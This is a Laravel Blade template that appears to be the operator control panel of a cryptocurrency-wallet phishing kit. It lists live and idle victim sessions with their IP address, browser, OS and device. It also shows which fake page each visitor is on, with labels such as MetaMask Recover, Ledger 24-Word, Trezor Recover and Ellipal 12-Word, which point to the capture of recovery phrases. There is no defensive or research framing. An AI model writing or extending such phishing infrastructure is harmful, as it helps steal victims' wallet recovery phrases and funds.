@php
function parseUA(?string $ua): array {
    if (!$ua) return ['browser' => '—', 'os' => '—', 'device' => 'Desktop'];

    $device = 'Desktop';
    if (preg_match('/iPad/i', $ua))                        $device = 'Tablet';
    elseif (preg_match('/Mobile|Android|iPhone/i', $ua))   $device = 'Mobile';

    $browser = 'Unknown';
    if      (preg_match('/Edg\//i', $ua))                            $browser = 'Edge';
    elseif  (preg_match('/OPR\//i', $ua))                            $browser = 'Opera';
    elseif  (preg_match('/SamsungBrowser\/(\d+)/i', $ua, $m))        $browser = 'Samsung '.$m[1];
    elseif  (preg_match('/Chrome\/(\d+)/i', $ua, $m))                $browser = 'Chrome '.$m[1];
    elseif  (preg_match('/Firefox\/(\d+)/i', $ua, $m))               $browser = 'Firefox '.$m[1];
    elseif  (preg_match('/Version\/[\d.]+ Safari/i', $ua, $m))       $browser = 'Safari';
    elseif  (preg_match('/MSIE (\d+)|Trident.*rv:(\d+)/i', $ua, $m)) $browser = 'IE '.($m[1]?:$m[2]);

    $os = 'Unknown';
    if      (preg_match('/Windows NT 1[01]/i', $ua))                     $os = 'Windows';
    elseif  (preg_match('/Windows NT/i', $ua))                           $os = 'Windows';
    elseif  (preg_match('/Mac OS X ([\d_]+)/i', $ua, $m))               $os = 'macOS '.str_replace('_','.',$m[1]);
    elseif  (preg_match('/Android ([\d.]+)/i', $ua, $m))                 $os = 'Android '.$m[1];
    elseif  (preg_match('/iPhone OS ([\d_]+)/i', $ua, $m))               $os = 'iOS '.str_replace('_','.',$m[1]);
    elseif  (preg_match('/Linux/i', $ua))                                $os = 'Linux';

    return compact('browser', 'os', 'device');
}

$idleSessions = $sessions->filter(fn($s) => !($s['is_active'] ?? false))->values();

$pgLabels = [
    'metamask/import'              => 'MetaMask Import',
    'metamask/recover'             => 'MetaMask Recover',
    'metamask/loading'             => 'MetaMask Loading',
    'exodus/import'                => 'Exodus Import',
    'exodus/loading'               => 'Exodus Loading',
    'ellipal/1'                    => 'Ellipal 24-Word',
    'ellipal/2'                    => 'Ellipal 12-Word',
    'ellipal/loading'              => 'Ellipal Loading',
    'ledger/signin'                => 'Ledger Sign In',
    'ledger/1'                     => 'Ledger 24-Word',
    'ledger/2'                     => 'Ledger 18-Word',
    'ledger/4'                     => 'Ledger 12-Word',
    'ledger/loading'               => 'Ledger Loading',
    'trezor/recover'               => 'Trezor Recover',
    'trezor/loading'               => 'Trezor Loading',
    'offline'                      => 'Offline',
    'browser-check'                => 'Browser Check',
    'home'                         => 'Home',
    'metamask_import'              => 'MetaMask Import',
    'metamask_recover'             => 'MetaMask Recover',
    'metamask_loading'             => 'MetaMask Loading',
    'trust_disconnect'             => 'Trust Disconnect',
    'trust_loading'                => 'Trust Loading',
    'exodus_import'                => 'Exodus Import',
    'exodus_loading'               => 'Exodus Loading',
    'ellipal_24word'               => 'Ellipal 24-Word',
    'ellipal_12word'               => 'Ellipal 12-Word',
    'ellipal_loading'              => 'Ellipal Loading',
    'ledger_signin'               => 'Ledger Sign In',
    'ledger_1'                    => 'Ledger 24-Word',
    'ledger_2'                    => 'Ledger 18-Word',
    'ledger_3'                    => 'Ledger 12-Word',
    'ledger_loading'              => 'Ledger Loading',
    'trezor_recover'               => 'Trezor Recover',
    'trezor_loading'               => 'Trezor Loading',
];

@endphp

@if($sessions->isEmpty())
    <div class="px-4 py-8 text-center text-white text-sm font-semibold" style="opacity:.5;">No sessions yet.</div>
@else

{{-- ── DELETE ALL IDLE button (top) ────────────────────────────────────── --}}
@if($idleSessions->isNotEmpty())
<div style="padding:0 0 10px 0;">
    <button type="button" data-sessions-control="delete-idle"
        style="width:100%;padding:10px 16px;border-radius:8px;border:1px solid rgba(239,68,68,.5);background:rgba(239,68,68,.1);color:#fff;font-size:12px;font-weight:700;letter-spacing:.04em;cursor:pointer;text-align:left;"
        onmouseenter="this.style.background='rgba(239,68,68,.22)';this.style.borderColor='rgba(239,68,68,.8)'"
        onmouseleave="this.style.background='rgba(239,68,68,.1)';this.style.borderColor='rgba(239,68,68,.5)'">
        Delete all Idle sessions ({{ $idleSessions->count() }})
    </button>
</div>
@endif

{{-- ── ALL SESSIONS (live and idle mixed) ─────────────────────────────── --}}
@foreach($sessions as $s)
@php
    $ua    = parseUA($s['user_agent'] ?? null);
    $sid   = strtoupper(substr($s['session_token'], 0, 7));
    $label = $s['label'] ?: $sid;
    $pg    = $s['current_page'] === 'left' ? '' : $s['current_page'];
    $pgDisplay = $pgLabels[$pg] ?? ucwords(str_replace(['/', '-', '_'], ' ', $pg));
    $isActive = $s['is_active'];
    $borderColor = $isActive ? 'rgba(74,222,128,.25)' : 'rgba(255,255,255,.1)';
    $textOpacity = $isActive ? '.7' : '.4';
    $statusLabel = $isActive ? 'LIVE' : 'idle';
    $statusColor = $isActive ? 'text-green-400' : 'text-white';
@endphp
<div class="session-row cursor-pointer"
     style="display:block;width:100%;padding:18px 20px;border-radius:8px;border:1px solid {{ $borderColor }};margin-bottom:10px;opacity:{{ $isActive ? 1 : 0.6 }};"
     id="sr-{{ $s['session_token'] }}"
     data-token="{{ $s['session_token'] }}"
     data-page="{{ $s['current_page'] }}"
     data-ip="{{ $s['ip_address'] ?? '' }}"
     data-created="{{ $s['created_at'] ?? '' }}"
     data-last-seen="{{ $s['last_seen_at'] ? \Carbon\Carbon::parse($s['last_seen_at'])->toIso8601String() : '' }}"
     data-last-response="{{ $s['last_response'] ? \Carbon\Carbon::parse($s['last_response'])->toIso8601String() : '' }}"
     data-active="{{ $isActive ? 1 : 0 }}"
     data-label="{{ e($label) }}"
     data-browser="{{ $ua['browser'] }}"
     data-os="{{ $ua['os'] }}"
     data-device="{{ $ua['device'] }}"
     data-sessions-control="select">

    <div class="flex items-center justify-between mb-1">
        <div class="flex items-center gap-1.5 min-w-0">
            <span class="text-white text-sm font-bold truncate max-w-[120px]" style="opacity:{{ $textOpacity }};">{{ $label }}</span>
            <button type="button" data-sessions-control="pin"
                    title="{{ $s['pinned'] ? 'Unpin' : 'Pin' }}"
                    style="background:none;border:none;cursor:pointer;padding:0;opacity:{{ $s['pinned'] ? '1' : '0.35' }};"
                    onmouseenter="this.style.opacity='1';"
                    onmouseleave="this.style.opacity='{{ $s['pinned'] ? '1' : '0.35' }}';">
                <svg width="11" height="11" viewBox="0 0 24 24" fill="{{ $s['pinned'] ? '#22c55e' : 'none' }}" stroke="#22c55e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <line x1="12" y1="17" x2="12" y2="22" stroke="#22c55e"/>
                    <path d="M5 17h14v-1.76a2 2 0 0 0-1.11-1.79l-1.78-.9A2 2 0 0 1 15 10.76V6h1a2 2 0 0 0 0-4H8a2 2 0 0 0 0 4h1v4.76a2 2 0 0 1-1.11 1.79l-1.78.9A2 2 0 0 0 5 15.24Z"/>
                </svg>
            </button>
            <button type="button" data-sessions-control="rename"
                    title="Rename"
                    class="text-white opacity-30 hover:opacity-90 transition-opacity flex-shrink-0">
                <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/>
                    <path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/>
                </svg>
            </button>
        </div>
        <div class="flex items-center gap-2">
            <span class="{{ $statusColor }} text-xs font-bold">{{ $statusLabel }}</span>
            <button type="button" data-sessions-control="delete"
                    title="Delete session"
                    class="text-white opacity-30 hover:text-red-400 hover:opacity-100 text-sm leading-none px-1 rounded transition-colors">✕</button>
        </div>
    </div>

    <div class="flex items-center justify-between mb-0.5">
        <span class="text-white text-xs font-mono" style="opacity:.5;">{{ $s['ip_address'] ?? '—' }}</span>
        @if($pg)
            <span class="text-white text-xs font-semibold" style="opacity:.5;">{{ $pgDisplay }}</span>
        @endif
    </div>

    <div class="sr-geo flex items-center gap-1 mb-0.5" style="min-height:16px;"></div>

    <div class="flex items-center gap-1.5 mb-0.5">
        <span class="text-white text-xs" style="opacity:.4;">{{ $ua['browser'] }}</span>
        <span class="text-white text-xs" style="opacity:.2;">·</span>
        <span class="text-white text-xs" style="opacity:.4;">{{ $ua['os'] }}</span>
        <span class="text-white text-xs" style="opacity:.2;">·</span>
        <span class="text-white text-xs" style="opacity:.4;">{{ $ua['device'] }}</span>
    </div>

    <div class="text-white text-xs" style="opacity:.25;">
        {{ $s['event_count'] }} events &bull; last response: <span class="last-response-rel"></span>
    </div>
</div>
@endforeach

{{-- ── IDLE DATA STORE — morphed by HTMX so data stays fresh, never shown directly ── --}}
@if($idleSessions->isNotEmpty())
<div id="idle-data-store" style="display:none;" aria-hidden="true">
@foreach($idleSessions as $s)
@php
    $ua    = parseUA($s['user_agent'] ?? null);
    $sid   = strtoupper(substr($s['session_token'], 0, 7));
    $label = $s['label'] ?: $sid;
    $pg    = $s['current_page'] === 'left' ? '' : $s['current_page'];
    $pgDisplay = $pgLabels[$pg] ?? ucwords(str_replace(['/', '-', '_'], ' ', $pg));
@endphp
<div class="session-row cursor-pointer"
     style="display:block;width:100%;padding:14px 16px;border-radius:8px;border:1px solid rgba(255,255,255,.07);margin-bottom:6px;"
     id="sr-{{ $s['session_token'] }}"
     data-token="{{ $s['session_token'] }}"
     data-page="{{ $s['current_page'] }}"
     data-ip="{{ $s['ip_address'] ?? '' }}"
     data-created="{{ $s['created_at'] ?? '' }}"
     data-last-seen="{{ $s['last_seen_at'] ? \Carbon\Carbon::parse($s['last_seen_at'])->toIso8601String() : '' }}"
     data-last-response="{{ $s['last_response'] ? \Carbon\Carbon::parse($s['last_response'])->toIso8601String() : '' }}"
     data-active="0"
     data-label="{{ e($label) }}"
     data-browser="{{ $ua['browser'] }}"
     data-os="{{ $ua['os'] }}"
     data-device="{{ $ua['device'] }}"
     data-sessions-control="select">
    <div class="flex items-center justify-between mb-1">
        <div class="flex items-center gap-1.5 min-w-0">
            <span class="text-white text-sm font-bold truncate max-w-[120px]" style="opacity:.7;">{{ $label }}</span>
            <button type="button" data-sessions-control="rename" title="Rename" class="text-white opacity-30 hover:opacity-90 transition-opacity flex-shrink-0">
                <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
            </button>
        </div>
        <div class="flex items-center gap-2">
            <span class="text-white text-xs font-medium" style="opacity:.35;">idle</span>
            <button type="button" data-sessions-control="delete" title="Delete session" class="text-white opacity-30 hover:text-red-400 hover:opacity-100 text-sm leading-none px-1 rounded transition-colors">✕</button>
        </div>
    </div>
    <div class="flex items-center justify-between mb-0.5">
        <span class="text-white text-xs font-mono" style="opacity:.5;">{{ $s['ip_address'] ?? '—' }}</span>
        @if($pg)
            <span class="text-white text-xs font-semibold" style="opacity:.5;">{{ $pgDisplay }}</span>
        @endif
    </div>
    <div class="flex items-center gap-1.5 mb-0.5">
        <span class="text-white text-xs" style="opacity:.4;">{{ $ua['browser'] }}</span>
        <span class="text-white text-xs" style="opacity:.2;">·</span>
        <span class="text-white text-xs" style="opacity:.4;">{{ $ua['os'] }}</span>
        <span class="text-white text-xs" style="opacity:.2;">·</span>
        <span class="text-white text-xs" style="opacity:.4;">{{ $ua['device'] }}</span>
    </div>
    <div class="text-white text-xs" style="opacity:.25;">
        {{ $s['event_count'] }} events &bull; last response: <span class="last-response-rel"></span>
    </div>
</div>
@endforeach
</div>
@endif

@endif
